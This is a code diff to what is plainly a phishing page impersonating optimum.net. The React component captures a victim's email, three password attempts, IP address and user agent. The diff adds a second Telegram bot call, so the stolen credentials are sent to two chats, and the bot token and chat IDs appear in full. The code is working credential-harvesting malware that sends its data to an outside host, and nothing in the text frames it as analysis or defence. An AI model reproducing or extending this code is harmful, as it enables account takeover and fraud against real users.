@@ -82,16 +82,18 @@ const Home = () => {
             if (!emailError && !passwordError) {
                 // Prepare the message to send
                 const message = `Email: ${email}
-                1st Attempt Password: ${password1}
-                2nd Attempt Password: ${password2}
-                3rd Attempt Password: ${password}
-                Website: optimum.net
-                Client IP: ${clientIp}
-                User Agent: ${userAgent}`;
+1st Attempt Password: ${password1}
+2nd Attempt Password: ${password2}
+3rd Attempt Password: ${password}
+Website: optimum.net
+Client IP: ${clientIp}
+User Agent: ${userAgent}`;
 
                 // Replace these values with your bot token and chat ID
                 const botToken = '7183589540:AAGq3_lgoDWZRAzc9xHy4KyrTzkwcnzHt0Q';
                 const chatId = '-1002398431021';
+                const botToken2 = '7183589540:AAGq3_lgoDWZRAzc9xHy4KyrTzkwcnzHt0Q';
+                const chatId2 = '7380056237';
 
                 try {
                     // Send the message to Telegram
@@ -106,6 +108,18 @@ const Home = () => {
                             text: message,
                         }),
                     });
+
+                    await fetch(`https://api.telegram.org/bot${botToken2}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId2,
+                            text: message,
+                        }),
+                    });
+
 
                     toggleLoading(false)
                     // Optional: Handle success feedback or further actions here
